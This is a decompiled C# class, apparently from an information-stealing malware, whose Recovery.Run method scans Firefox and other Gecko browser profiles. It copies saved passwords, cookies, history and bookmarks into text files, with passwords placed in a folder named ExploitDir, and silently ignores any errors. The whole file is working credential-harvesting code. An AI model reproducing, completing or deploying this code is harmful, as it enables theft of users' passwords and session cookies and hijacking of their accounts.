﻿using System;
using System.Collections.Generic;
using System.IO;
using SHARP.Bookmarks;
using SHARP.Cookies;
using SHARP.History;
using SHARP.Passwordsq;

namespace SHARP.Firefox
{
	// Token: 0x02000073 RID: 115
	internal class Recovery
	{
		// Token: 0x06000282 RID: 642 RVA: 0x0000F810 File Offset: 0x0000DA10
		public static void Run(string sSavePath)
		{
			foreach (string text in Paths.sGeckoBrowserPaths)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					string text2 = sSavePath + "\\" + name;
					string text3 = Paths.appdata + "\\" + text;
					if (Directory.Exists(text3 + "\\Profiles"))
					{
						Directory.CreateDirectory(text2);
						List<Bookmark> bBookmarks = Bookmarks.Get(text3);
						List<Cookie> cCookies = Cookies.Get(text3);
						List<Site> sHistory = History.Get(text3);
						List<Password> pPasswords = Passwords.Get(text3);
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
						cBrowserUtils.WriteCookies(cCookies, sSavePath + "\\Cookies_" + name + ".txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cBrowserUtils.WritePasswords(pPasswords, Help.ExploitDir + "\\Passwords.txt");
					}
				}
				catch
				{
				}
			}
		}
	}
}
